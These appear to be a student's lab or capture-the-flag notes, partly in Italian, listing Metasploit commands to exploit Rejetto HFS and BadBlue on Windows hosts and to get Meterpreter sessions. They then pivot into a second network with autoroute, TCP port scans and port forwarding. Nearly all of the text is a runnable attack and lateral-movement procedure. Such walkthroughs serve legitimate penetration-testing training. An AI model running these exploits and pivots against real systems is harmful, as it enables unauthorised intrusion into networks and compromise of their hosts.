```
> service postgresql start && msfconsole
> workspace -a Pivoting
> db_nmap -sV -p> -O <Victim1IP>
> services
> search rejetto
> use exploit/windows/http/rejetto_hfs_exec
> show options
> set rhosts <Victim1 IP>
> run


Got Meterpreter session:
> sysinfo
> getuid
> ipconfig
> run autoroute -s <Victim2 IP/24>

Run this in background:
> background

Rename the session 1 meterpreter:
> sessions -n victim1 -i 1
> sessions

Now portscan:
> search portscan
> use auxiliary/scanner/portscan/tcp
> show options
> set rhosts Victim2iP
> exploit

Port 80 open port found on victim2
Now go to session in metereter:
> sessions 1
> portfwd add -l 1234 -p 80 -r <Victim2IP>

Now again put this session in background:
> background
> db_nmap -sV -sS -p 1234 localhost
> search badblue
> use exploit/windows/http/badblue_passthru
> show options
> set payload windows/meterpreter/bind_tcp
> set rhosts <Victim2IP>
> set LPORT 4433
> run


Got meterpreter session:
Observe that this is 2016 and old is 2012
> get flag




### MsfConsole - AutoRoute + Scanning Using Autoroute + Pivoting
Devo ruotare tutto il traffico che gira su MSfConsole utilizzando l'ip 192.125.162.2 sul quale ho stabilito una sessione meterpreter
meterpreter > ip a
meterpreter > run autoroute -s 192.125.162.2

CTRL + Z [background session]

> use auxiliary/scanner/portscan/tcp 
> set RHOSTS 192.125.162.3 
> set verbose true
> set ports 1-1000 
> exploit
[Scanned 1 of 1 hosts]
[192.125.162.3:80 TCP Open]

# MsfConsole - Pivoting
Forward the remote port 80 to local port 1234
> sessions -i 1
> portfwd add -l 1234 -p 80 -r 192.125.162.3
> portfwd list

Do not close msfconsole
> nmap -sV -Pn -p 1234 localhost


```